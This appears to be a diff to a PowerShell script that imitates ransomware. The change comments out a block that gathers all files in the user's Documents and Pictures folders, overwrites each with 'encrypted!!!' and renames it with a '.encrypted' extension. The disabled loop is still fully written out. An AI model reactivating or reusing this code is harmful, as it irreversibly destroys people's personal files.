@@ -57,15 +57,15 @@ Invoke-Item $notePath
 
 # Encrypt files
 
-$documentsPath = [Environment]::GetFolderPath("MyDocuments")
-$picturesPath = [Environment]::GetFolderPath("MyPictures")
-$documents = Get-ChildItem $documentsPath -File *
-$pictures = Get-ChildItem $picturesPath -File *
-$files = $documents + $pictures
+# $documentsPath = [Environment]::GetFolderPath("MyDocuments")
+# $picturesPath = [Environment]::GetFolderPath("MyPictures")
+# $documents = Get-ChildItem $documentsPath -File *
+# $pictures = Get-ChildItem $picturesPath -File *
+# $files = $documents + $pictures
     
-foreach ($file in $files) {
-    $filepath = $file.FullName
-    $filename = $file.Name
-    Set-Content -Path $filepath -Value "encrypted!!!"
-    Rename-Item -Path $filepath -NewName "$filename.encrypted"
-}
+# foreach ($file in $files) {
+#     $filepath = $file.FullName
+#     $filename = $file.Name
+#     Set-Content -Path $filepath -Value "encrypted!!!"
+#     Rename-Item -Path $filepath -NewName "$filename.encrypted"
+# }
